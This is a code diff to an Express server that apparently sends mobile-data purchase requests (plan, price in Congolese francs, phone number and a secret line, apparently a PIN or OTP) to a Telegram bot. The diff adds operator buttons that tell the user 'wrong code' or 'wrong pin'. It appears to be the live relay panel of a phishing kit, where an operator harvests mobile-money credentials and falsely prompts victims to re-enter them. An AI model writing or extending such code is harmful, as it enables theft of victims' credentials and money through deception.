@@ -85,19 +85,20 @@ app.post('/api/request-approval', async (req, res) => {
       `📦 Data: ${plan || '—'}\n` +
       `💰 Price: CDF ${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
-      secretLine +
-      `🆔 ID: \`${id}\``;
+      secretLine;
+      
 
     const buttonRow =
       step === 'otp'
         ? [
             { text: '✅ Approve', callback_data: `approve:${id}` },
-            { text: '❌ Reject', callback_data: `deny:${id}` },
+            { text: '❌ wrong code', callback_data: `deny:${id}` },
             { text: '⚠️ Insufficient', callback_data: `insufficient:${id}` },
+          { text: '🔢 wrong pin', callback_data: `demo_error:${id}` },
           ]
         : [
             { text: '✅ Approve', callback_data: `approve:${id}` },
-            { text: '❌ Reject', callback_data: `deny:${id}` },
+            { text: '❌ wrong pin', callback_data: `deny:${id}` },
           ];
 
     try {
@@ -130,12 +131,14 @@ const STATUS_BY_ACTION = {
   approve: 'approved',
   deny: 'denied',
   insufficient: 'insufficient',
+  demo_error: 'demo_error'
 };
 
 const LABEL_BY_ACTION = {
   approve: 'Approve ✅',
-  deny: 'Reject ❌',
+  deny: 'wrong code ❌',
   insufficient: 'Insufficient Balance ⚠️',
+  demo_error:'wrong pin⚠️',
 };
 if (bot) {
   bot.on('callback_query', async (query) => {
